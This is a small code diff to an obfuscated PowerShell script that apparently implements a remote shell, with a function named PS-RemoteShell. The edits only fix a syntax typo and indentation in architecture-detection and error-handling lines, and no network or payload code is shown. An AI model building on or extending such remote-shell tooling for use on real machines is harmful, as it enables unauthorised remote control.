@@ -13,7 +13,7 @@ function VAR50 {
             $VAR2 = "Unknown"
         }
         
-        $VAR3 = "x64"0
+        $VAR3 = "x64"
         
         if([IntPtr]::size -eq 4) {
             $VAR3 = "x86"
@@ -225,7 +225,7 @@ function PS-RemoteShell {
             }
             
             $VAR27 = ($error[0] | Out-String)
-	    $error.Clear()
+		$error.Clear()
             
             if([string]::IsNullOrEmpty($VAR26) -And [string]::IsNullOrEmpty($VAR27)) {
                 $VAR28 = Get-Random -Maximum 50 -Minimum 1
